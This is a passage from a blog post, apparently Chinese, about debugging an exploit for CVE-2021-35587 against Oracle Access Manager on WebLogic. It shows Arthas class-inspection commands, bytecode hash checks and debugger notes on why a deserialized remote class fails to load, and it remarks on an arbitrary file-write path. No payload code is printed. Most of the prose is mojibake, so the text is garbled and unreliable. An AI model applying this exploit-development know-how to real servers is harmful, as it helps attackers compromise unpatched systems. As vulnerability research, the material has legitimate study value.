</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-84-31><a style=outline:none;text-decoration:none;color:inherit href=#hl-84-31>31</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-84-32><a style=outline:none;text-decoration:none;color:inherit href=#hl-84-32>32</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-84-33><a style=outline:none;text-decoration:none;color:inherit href=#hl-84-33>33</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-84-34><a style=outline:none;text-decoration:none;color:inherit href=#hl-84-34>34</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-84-35><a style=outline:none;text-decoration:none;color:inherit href=#hl-84-35>35</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-84-36><a style=outline:none;text-decoration:none;color:inherit href=#hl-84-36>36</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-84-37><a style=outline:none;text-decoration:none;color:inherit href=#hl-84-37>37</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-84-38><a style=outline:none;text-decoration:none;color:inherit href=#hl-84-38>38</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-84-39><a style=outline:none;text-decoration:none;color:inherit href=#hl-84-39>39</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-84-40><a style=outline:none;text-decoration:none;color:inherit href=#hl-84-40>40</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-84-41><a style=outline:none;text-decoration:none;color:inherit href=#hl-84-41>41</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-84-42><a style=outline:none;text-decoration:none;color:inherit href=#hl-84-42>42</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-84-43><a style=outline:none;text-decoration:none;color:inherit href=#hl-84-43>43</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-84-44><a style=outline:none;text-decoration:none;color:inherit href=#hl-84-44>44</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-84-45><a style=outline:none;text-decoration:none;color:inherit href=#hl-84-45>45</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-84-46><a style=outline:none;text-decoration:none;color:inherit href=#hl-84-46>46</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-84-47><a style=outline:none;text-decoration:none;color:inherit href=#hl-84-47>47</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-84-48><a style=outline:none;text-decoration:none;color:inherit href=#hl-84-48>48</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-84-49><a style=outline:none;text-decoration:none;color:inherit href=#hl-84-49>49</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-84-50><a style=outline:none;text-decoration:none;color:inherit href=#hl-84-50>50</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-84-51><a style=outline:none;text-decoration:none;color:inherit href=#hl-84-51>51</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-84-52><a style=outline:none;text-decoration:none;color:inherit href=#hl-84-52>52</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-84-53><a style=outline:none;text-decoration:none;color:inherit href=#hl-84-53>53</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#f92672>[</span>arthas@181<span style=color:#f92672>]</span>$ sc *Remotable*
</span></span><span style=display:flex><span>com.tangosol.internal.util.invoke.Remotable
</span></span><span style=display:flex><span>com.tangosol.internal.util.invoke.RemotableSupport
</span></span><span style=display:flex><span>com.tangosol.internal.util.invoke.RemotableSupport$$Lambda$143/386686148
</span></span><span style=display:flex><span>com.tangosol.internal.util.invoke.lambda.AbstractRemotableLambda
</span></span><span style=display:flex><span>Affect<span style=color:#f92672>(</span>row-cnt:4<span style=color:#f92672>)</span> cost in <span style=color:#ae81ff>360</span> ms.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>arthas@181<span style=color:#f92672>]</span>$ sc -d com.tangosol.internal.util.invoke.Remotable
</span></span><span style=display:flex><span> class-info        com.tangosol.internal.util.invoke.Remotable
</span></span><span style=display:flex><span> code-source       /u01/oracle/coherence/lib/coherence.jar
</span></span><span style=display:flex><span> name              com.tangosol.internal.util.invoke.Remotable
</span></span><span style=display:flex><span> isInterface       true
</span></span><span style=display:flex><span> isAnnotation      false
</span></span><span style=display:flex><span> isEnum            false
</span></span><span style=display:flex><span> isAnonymousClass  false
</span></span><span style=display:flex><span> isArray           false
</span></span><span style=display:flex><span> isLocalClass      false
</span></span><span style=display:flex><span> isMemberClass     false
</span></span><span style=display:flex><span> isPrimitive       false
</span></span><span style=display:flex><span> isSynthetic       false
</span></span><span style=display:flex><span> simple-name       Remotable
</span></span><span style=display:flex><span> modifier          abstract,interface,public
</span></span><span style=display:flex><span> annotation
</span></span><span style=display:flex><span> interfaces        com.tangosol.io.SerializationSupport
</span></span><span style=display:flex><span> super-class
</span></span><span style=display:flex><span> class-loader      +-PolicyClassLoader <span style=color:#e6db74>&#39;weblogic-launcher&#39;</span> @16267862 <span style=color:#f92672>{</span>file:/home/oracle/arthas/arthas-agent.jar file:/u01/oracle/wlserver/server/lib/weblogic-launcher.jar ... <span style=color:#f92672>(</span><span style=color:#ae81ff>798</span> more<span style=color:#f92672>)}</span>
</span></span><span style=display:flex><span>                     +-sun.misc.Launcher$AppClassLoader@18b4aac2
</span></span><span style=display:flex><span>                       +-sun.misc.Launcher$ExtClassLoader@495ae1c3
</span></span><span style=display:flex><span> classLoaderHash   <span style=color:#ae81ff>16267862</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span> class-info        com.tangosol.internal.util.invoke.lambda.AbstractRemotableLambda
</span></span><span style=display:flex><span> code-source       /u01/oracle/coherence/lib/coherence.jar
</span></span><span style=display:flex><span> name              com.tangosol.internal.util.invoke.lambda.AbstractRemotableLambda
</span></span><span style=display:flex><span> isInterface       false
</span></span><span style=display:flex><span> isAnnotation      false
</span></span><span style=display:flex><span> isEnum            false
</span></span><span style=display:flex><span> isAnonymousClass  false
</span></span><span style=display:flex><span> isArray           false
</span></span><span style=display:flex><span> isLocalClass      false
</span></span><span style=display:flex><span> isMemberClass     false
</span></span><span style=display:flex><span> isPrimitive       false
</span></span><span style=display:flex><span> isSynthetic       false
</span></span><span style=display:flex><span> simple-name       AbstractRemotableLambda
</span></span><span style=display:flex><span> modifier          abstract,public
</span></span><span style=display:flex><span> annotation
</span></span><span style=display:flex><span> interfaces        com.tangosol.internal.util.invoke.Remotable,com.oracle.common.base.CanonicallyNamed,java.io.Serializable
</span></span><span style=display:flex><span> super-class       +-java.lang.Object
</span></span><span style=display:flex><span> class-loader      +-PolicyClassLoader <span style=color:#e6db74>&#39;weblogic-launcher&#39;</span> @16267862 <span style=color:#f92672>{</span>file:/home/oracle/arthas/arthas-agent.jar file:/u01/oracle/wlserver/server/lib/weblogic-launcher.jar ... <span style=color:#f92672>(</span><span style=color:#ae81ff>798</span> more<span style=color:#f92672>)}</span>
</span></span><span style=display:flex><span>                     +-sun.misc.Launcher$AppClassLoader@18b4aac2
</span></span><span style=display:flex><span>                       +-sun.misc.Launcher$ExtClassLoader@495ae1c3
</span></span><span style=display:flex><span> classLoaderHash   <span style=color:#ae81ff>16267862</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Affect<span style=color:#f92672>(</span>row-cnt:2<span style=color:#f92672>)</span> cost in <span style=color:#ae81ff>79</span> ms.
</span></span></code></pre></td></tr></table></div></div><p>ä½†æ˜¯ä¸ºä½•ç±»åŠ è½½å™¨å°±æ˜¯æ‰¾ä¸åˆ°å‘¢ï¼Ÿå®åœ¨è´¹è§£ã€‚</p><h4 id=å°è¯•ä½¿ç”¨arthasæ·»åŠ è‡ªå®šä¹‰ç±»>å°è¯•ä½¿ç”¨arthasæ·»åŠ è‡ªå®šä¹‰ç±»<a hidden class=anchor aria-hidden=true href=#å°è¯•ä½¿ç”¨arthasæ·»åŠ è‡ªå®šä¹‰ç±»>#</a></h4><p>æ­¤æ—¶çš„æˆ‘æœ‰äº›æ‡µï¼Œç”šè‡³æ€€ç–‘æ˜¯ä¸æ˜¯ <code>pers.neo.test</code> ç±»åœ¨æœåŠ¡ç«¯æ²¡æœ‰å®šä¹‰å¯¼è‡´çš„ï¼Œæƒ³å°è¯•ä½¿ç”¨arthasæ·»åŠ ä¸€ä¸ªç±»ã€‚</p><p>ç»è¿‡æœç´¢ï¼Œå‘ç° <a href=https://arthas.aliyun.com/doc/en/retransform.html>retransform</a> å‘½ä»¤å¯ä»¥åšåˆ°ï¼Œä½†å°è¯•äº†æ²¡æœ‰æˆåŠŸï¼ŒæŠ¥é”™</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-85-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-85-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-85-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-85-2>2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-85-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-85-3>3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-85-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-85-4>4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-85-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-85-5>5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-85-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-85-6>6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-85-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-85-7>7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-85-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-85-8>8</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#f92672>[</span>arthas@181<span style=color:#f92672>]</span>$ sc *pers.neo*
</span></span><span style=display:flex><span>Affect<span style=color:#f92672>(</span>row-cnt:0<span style=color:#f92672>)</span> cost in <span style=color:#ae81ff>30</span> ms.
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>arthas@181<span style=color:#f92672>]</span>$ 
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>arthas@181<span style=color:#f92672>]</span>$ retransform /tmp/test.class 
</span></span><span style=display:flex><span>These classes are not found in the JVM and may not be loaded: <span style=color:#f92672>[</span>pers.neo.test<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>arthas@181<span style=color:#f92672>]</span>$ 
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>arthas@181<span style=color:#f92672>]</span>$ sc *pers.neo*
</span></span><span style=display:flex><span>Affect<span style=color:#f92672>(</span>row-cnt:0<span style=color:#f92672>)</span> cost in <span style=color:#ae81ff>29</span> ms.
</span></span></code></pre></td></tr></table></div></div><p>æ–‡æ¡£è¯´æ˜¯æœ‰é™åˆ¶</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-86-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-86-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-86-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-86-2>2</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>New field/method is not allowed
</span></span><span style=display:flex><span>The function that is running, no exit can not take effect, such as the new System.out.println added below, only the run() function will take effect.
</span></span></code></pre></td></tr></table></div></div><p>è½¬å¿µæƒ³åˆ°æ—¢ç„¶åœ¨æœ¬åœ°ï¼Œåœ¨ä¾èµ–åº“é½å…¨çš„æƒ…å†µä¸‹ï¼Œä¸éœ€è¦pers.neo.testç±»ä¹Ÿæ˜¯å¯ä»¥å®Œæˆååºåˆ—åŒ–çš„ï¼Œè¯´æ˜åºåˆ—åŒ–æ•°æ®ä¸­å·²ç»åŒ…å«äº†æ‰€æœ‰éœ€è¦çš„ä¿¡æ¯ï¼Œé¡ºåˆ©çš„æƒ…å†µä¸‹é€šè¿‡å­—èŠ‚ç è¶³ä»¥å®Œå…¨è¿˜åŸ <code>pers.neo.test</code> ç±»äº†ã€‚</p><h4 id=æœ¬åœ°è¿œç¨‹demoå¯¹æ¯”>æœ¬åœ°è¿œç¨‹demoå¯¹æ¯”<a hidden class=anchor aria-hidden=true href=#æœ¬åœ°è¿œç¨‹demoå¯¹æ¯”>#</a></h4><p>åœ¨ weblogic.utils.classloaders.ChangeAwareClassLoader#findClass ä¸‹æ–­ç‚¹</p><p>æœ¬åœ°æ˜¯èƒ½æ‰¾åˆ°è¿™ä¸ªinterfaceçš„</p><p><img loading=lazy src=image-20220326173253221.png alt=image-20220326173253221></p><p>è¿œç¨‹çš„ä¼šæŠ¥é”™</p><p><img loading=lazy src=image-20220326173439938.png alt=image-20220326173439938></p><p>è™½ç„¶ä¸çŸ¥é“ä¸ºä½•å¦‚æ­¤ï¼Œä½†äº‹å®å°±æ˜¯å¦‚æ­¤ï¼Œè¿œç¨‹çš„classloaderæ‰¾ä¸åˆ°è¿™ä¸ªç±»ã€‚</p><h4 id=å°è¯•è°ƒè¯•oammså®¹å™¨ä¸­çš„defineclassè¿‡ç¨‹>å°è¯•è°ƒè¯•oammså®¹å™¨ä¸­çš„defineClassè¿‡ç¨‹<a hidden class=anchor aria-hidden=true href=#å°è¯•è°ƒè¯•oammså®¹å™¨ä¸­çš„defineclassè¿‡ç¨‹>#</a></h4><p>æ—¢ç„¶æœ¬åœ°æˆåŠŸäº†ï¼Œè€Œè¿œç¨‹ä¸è¡Œï¼ŒåŠ ä¸Šç½‘ä¸Šæœ‰äººè®¤ä¸ºdefineclasså‡ºé”™å¯èƒ½æ˜¯versionä¸å¯¹ï¼Œåªå¥½å†ç¡¬ç€å¤´çš®ä»”ç»†è°ƒè¯•oammså®¹å™¨ä¸­é‚£ä¸ªè¿›è¿›å‡ºå‡ºnativeå±‚çš„defineClassè¿‡ç¨‹ã€‚</p><p>åœ¨ com.tangosol.internal.util.invoke.RemotableSupport#defineClass ä¸‹æ–­ç‚¹è·Ÿè¿›ã€‚</p><h5 id=æ¯”å¯¹abclassæ•°ç»„æ˜¯å¦ä¸€è‡´ä¸€è‡´>æ¯”å¯¹abClassæ•°ç»„æ˜¯å¦ä¸€è‡´ï¼šä¸€è‡´<a hidden class=anchor aria-hidden=true href=#æ¯”å¯¹abclassæ•°ç»„æ˜¯å¦ä¸€è‡´ä¸€è‡´>#</a></h5><p>ç¯å¢ƒä¸­çš„defination</p><p><img loading=lazy src=image-20220630212626700.png alt=image-20220630212626700></p><p>ç”Ÿæˆpayloadæ—¶å€™çš„defination</p><p><img loading=lazy src=image-20220630212813631.png alt=image-20220630212813631></p><p>çœ‹èµ·æ¥æ˜¯ä¸€æ¨¡ä¸€æ ·çš„ã€‚å–å‡ºå…¶ä¸­çš„ oammsååºåˆ—åŒ–æ—¶çš„ definition.m_abClasså’Œ ç”Ÿæˆpayloadæ—¶çš„constructor.m_definition.m_abClassï¼Œä»–ä»¬ä¿©éƒ½æ˜¯1545å­—èŠ‚é•¿ï¼Œä½†ç›´æ¥è®¡ç®—.hashCodeå€¼ä¸åŒã€‚è®¡ç®—å“ˆå¸Œå€¼æ¯”è¾ƒã€‚</p><p>é€šè¿‡evaluateæ‰§è¡Œ</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-87-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-87-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-87-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-87-2>2</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>new java.math.BigInteger(1,java.security.MessageDigest.getInstance(&#34;MD5&#34;).digest(constructor.m_definition.m_abClass)).toString(16)
</span></span><span style=display:flex><span>new java.math.BigInteger(1,java.security.MessageDigest.getInstance(&#34;MD5&#34;).digest(abClass)).toString(16)
</span></span></code></pre></td></tr></table></div></div><p>å‰è€…éƒ½æ˜¯bce0f353100a294f763a2d72e6a91ff9ï¼Œæ˜¯ä¸€æ ·çš„ã€‚</p><h5 id=æ²¡æœ‰å°†å­—èŠ‚ç å†™åˆ°ç£ç›˜ä¸­ä½†å­˜åœ¨è·¨è·¯å¾„å†™æ–‡ä»¶>â˜…æ²¡æœ‰å°†å­—èŠ‚ç å†™åˆ°ç£ç›˜ä¸­ï¼Œä½†å­˜åœ¨è·¨è·¯å¾„å†™æ–‡ä»¶<a hidden class=anchor aria-hidden=true href=#æ²¡æœ‰å°†å­—èŠ‚ç å†™åˆ°ç£ç›˜ä¸­ä½†å­˜åœ¨è·¨è·¯å¾„å†™æ–‡ä»¶>#</a></h5><p>com.tangosol.internal.util.invoke.RemotableSupport#defineClass</p><p><img loading=lazy src=image-20220630215821723.png alt=image-20220630215821723></p><p>è¿™é‡Œçš„DUMP_REMOTABLEé…ç½®æ¥è‡ªäº <code>coherence.server.remotable.dumpClasses</code> ï¼Œæ˜¯nullã€‚</p><p><img loading=lazy src=image-20220713201632871.png alt=image-20220713201632871></p><p>å¦‚æœéç©ºçš„è¯ï¼Œä¼šæŠŠå®ƒä½œä¸ºç›®å½•å°†æˆ‘ä»¬çš„å­—èŠ‚ç å†™å…¥è¯¥ç›®å½•ä¸‹çš„classæ–‡ä»¶ä¸­ã€‚</p><p><img loading=lazy src=image-20220713202237312.png alt=image-20220713202237312></p><p>å› ä¸º coherence.server.remotable.dumpClasses æ²¡æœ‰ä¸“é—¨é…ç½®ç›®å½•</p><p><img loading=lazy src=image-20220630215859283.png alt=image-20220630215859283></p><p>æ‰€ä»¥è·³è¿‡äº† com.tangosol.internal.util.invoke.ClassDefinition#dumpClass å†™classæ–‡ä»¶çš„é€»è¾‘ã€‚</p><p>ä½†å¦‚æœè¿›å…¥è¿™ä¸ªé€»è¾‘ï¼Œè¿™é‡Œæ˜¯å¯ä»¥å‘ä»»æ„è·¯å¾„å†™ä»»æ„å†…å®¹æ–‡ä»¶çš„ã€‚</p><p><img loading=lazy src=image-20220630215632273.png alt=image-20220630215632273></p><h5 id=è¿›å…¥defineclass>è¿›å…¥defineClass<a hidden class=anchor aria-hidden=true href=#è¿›å…¥defineclass>#</a></h5><p>ç„¶åå°±æ¥åˆ°äº†éå¸¸æ¢¦å¹»ä¸”é‡è¦çš„åœ°æ–¹</p><p><img loading=lazy src=image-20220630220226094.png alt=image-20220630220226094></p><p>å¤±è´¥å°±å‘ç”Ÿåœ¨è¿™ä¸ªæ–¹æ³•é‡Œé¢</p><p>preDefinaClasså’ŒdefineClassSourceLocationéƒ½æ­£å¸¸</p><p><img loading=lazy src=image-20220630221107046.png alt=image-20220630221107046></p><p>ç„¶ååˆ°äº†nativeï¼Œ java.lang.ClassLoader#defineClass1</p><p><img loading=lazy src=image-20220630220925641.png alt=image-20220630220925641></p><p>é©¬ä¸Šåˆå‡ºæ¥åˆ°äº† rt.jarçš„ sun.instrument.InstrumentationImpl#transform</p><p><img loading=lazy src=image-20220630221034001.png alt=image-20220630221034001></p><p>è¿›åˆ° sun.instrument.TransformerManager#transform</p><p><img loading=lazy src=image-20220630221439700.png alt=image-20220630221439700></p><p>transformå¤±è´¥ï¼Œè¿”å›nullï¼Œä¸ºä»€ä¹ˆå‘¢ï¼Ÿç±»åå’Œbytecodeéƒ½æœ‰äº†ï¼Œä¸ºä»€ä¹ˆä¼štransformå¤±è´¥å‘¢ï¼Ÿtransformç©¶ç«Ÿå‘ç”Ÿäº†ä»€ä¹ˆå‘¢ï¼Ÿ</p><p><img loading=lazy src=image-20220630222230725.png alt=image-20220630222230725></p><p>transformè¿”å›å‰çš„è°ƒç”¨æ ˆæ˜¯è¿™æ ·çš„</p><p><img loading=lazy src=image-20220630222418963.png alt=image-20220630222418963></p><p>F7æ­¥è¿›ä¹‹åå˜æˆäº†</p><p><img loading=lazy src=image-20220630222536486.png alt=image-20220630222536486></p><p>ç»§ç»­F7å°±æ¥åˆ°äº†AttributeHolderçš„ååºåˆ—åŒ–è¿‡ç¨‹ï¼Œä¸€ä¸ªå¥‡æ€ªçš„åœ°æ–¹ï¼Œä¸€å®šæ˜¯å·²ç»è·³è¿‡äº†ä¸€äº›å…¶ä»–é€»è¾‘ï¼Œideaæ²¡æœ‰ä¸¥æ ¼æ­¥è¿›ã€‚</p><p><img loading=lazy src=image-20220630222849994.png alt=image-20220630222849994></p><h5 id=jump-into-rabbit-hole>jump into rabbit hole<a hidden class=anchor aria-hidden=true href=#jump-into-rabbit-hole>#</a></h5><p>æˆ‘ä»¬éœ€è¦çŸ¥é“ï¼Œtransform è¿”å› nullä¹‹åï¼ŒattributeHolderæŠ¥é”™ä¹‹å‰ï¼Œå‘ç”Ÿäº†ä»€ä¹ˆï¼Ÿä½†nativeå±‚å’ŒJavaå±‚çš„åå¤æ¨ªè·³å®åœ¨éš¾ä»¥è·Ÿè¸ªã€‚</p><p>åœ¨ com.tangosol.internal.util.invoke.RemotableSupport#defineClass ä¸‹æ–­ç‚¹</p><p>å†æ ¹æ®é”™è¯¯å †æ ˆåœ¨classloaderçš„å‡ ä¸ªåœ°æ–¹ä¸‹æ–­ç‚¹</p><p><img loading=lazy src=image-20220630223339159.png alt=image-20220630223339159></p><p>åˆ†åˆ«æ˜¯åœ¨ClassLoader.javaçš„351ã€418ã€523è¡Œä¸‹æ–­ç‚¹</p><p>åœ¨transform è¿”å›ä¸€ä¸ªnullçš„var7ä¹‹åæŒ‰F7æ­¥è¿›</p><p><img loading=lazy src=image-20220630223419119.png alt=image-20220630223419119></p><p>æœç„¶æ¥åˆ°äº†rabbitholeï¼Œä¹Ÿå°±æ˜¯classLoaderçš„351è¡Œ</p><p><img loading=lazy src=image-20220630223843984.png alt=image-20220630223843984></p><p>è¿™ä¸ªloadClass æ˜¯å±äº /root/cwd/cveplay/cve-2021-35587/weblogiclib/coherence.jar é‡Œé¢çš„com/tangosol/internal/util/invoke/RemotableSupport.classçš„ï¼Œå› ä¸ºå®ƒextendäº†ClassLoader</p><p><img loading=lazy src=image-20220630224234638.png alt=image-20220630224234638></p><p>ä»”ç»†è§‚å¯ŸRemotableSupportå¯¹è±¡ã€‚é‡Œé¢ç”šè‡³æœ‰æˆ‘ä»¬ä¹‹å‰å°è¯•åŠ è½½çš„ç±»ï¼Œè¿™æ˜¯æ€ä¹ˆå›äº‹å‘¢ï¼Ÿä¸æ¸…æ¥šï¼Œæš‚æ—¶æ”¾ç€ã€‚</p><p><img loading=lazy src=image-20220630224631896.png alt=image-20220630224631896></p><p>è¿™ä¸ªloadClassåœ¨å°è¯•åŠ è½½ com.tangosol.internal.util.invoke.Remotableç±»</p><p>å°è¯•å…³é—­smart step intoï¼Œä¹‹åå†f7ï¼Œè¿˜æ˜¯æ²¡æœ‰ç”¨ï¼Œåˆæ¥åˆ°äº†AttributeHolderæŠ¥é”™çš„åœ°æ–¹ï¼Œè¿™ä¸æ˜¯æˆ‘æƒ³çœ‹åˆ°çš„ã€‚</p><p><img loading=lazy src=image-20220630225747401.png alt=image-20220630225747401></p><h5 id=ä»transformå†å¼€å§‹>ä»transformå†å¼€å§‹<a hidden class=anchor aria-hidden=true href=#ä»transformå†å¼€å§‹>#</a></h5><p>åˆ°loadClass</p><p><img loading=lazy src=image-20220630230303789.png alt=image-20220630230303789></p><p>æ‰‹åŠ¨è¿›å…¥å‡½æ•°å®šä¹‰ä¸‹æ–­ç‚¹ï¼Œå†æ­¥è¿›ï¼Œçœ‹åˆ°æ˜¯å› ä¸º com/tangosol/internal/util/invoke/RemotableSupport.class è°ƒç”¨findLoadedClasså¯»æ‰¾com.tangosol.internal.util.invoke.Remotableæ—¶è¿”å›äº†nullã€‚</p><p><img loading=lazy src=image-20220630230654620.png alt=image-20220630230654620></p><p>æˆ–è®¸ï¼Œè¿™é‡Œï¼Œå°±æ˜¯æ•´ä¸ªæŠ¥é”™çš„æ ¹å› äº†ã€‚</p><h5 id=æŸ³æš—èŠ±æ˜>æŸ³æš—èŠ±æ˜<a hidden class=anchor aria-hidden=true href=#æŸ³æš—èŠ±æ˜>#</a></h5><p>ç°è±¡æ˜¯ç†è§£äº†ï¼Œä½†æ˜¯ï¼Œä¸ºä»€ä¹ˆè¿™ä¸ªclassLoaderæ‰¾ä¸åˆ°è¿™ä¸ªæ˜æ˜å­˜åœ¨çš„ç±»å‘¢ï¼Ÿè™½ç„¶è¿™ä¸æ˜¯ä¸€ä¸ªç±»ï¼Œæ˜¯ä¸€ä¸ªæ¥å£ï¼Œä½†ä¹Ÿåº”è¯¥è¢«åŠ è½½äº†å•Šã€‚</p><p>çœ‹æŠ¥é”™è°ƒç”¨æ ˆç¬¬åå…­è¡Œä¹Ÿæ˜¯ <code>RemotableSupport (com.tangosol.internal.util.invoke)</code> è¿™ä¸ªå¯¹è±¡è°ƒç”¨ <code>defineClass</code> å»å¯»æ‰¾ <code>com.tangosol.internal.util.invoke.Remotable</code> æ—¶å‡ºé”™ï¼Œè€Œ<code> RemotableSupport</code> å’Œ <code>Remotable</code> ` ï¼Œæ˜æ˜åœ¨åŒä¸€ä¸ªåŒ…åº•ä¸‹ï¼Œä¸ºä½•ä¸€ä¸ªç±»èƒ½æ­£å¸¸æ‰§è¡Œï¼Œå´æ‰¾ä¸åˆ°åŒä¸€ä¸ªåŒ…ä¸‹çš„å¦ä¸€ä¸ªç±»å‘¢ï¼Ÿ</p><p><img loading=lazy src=image-20220630231117661.png 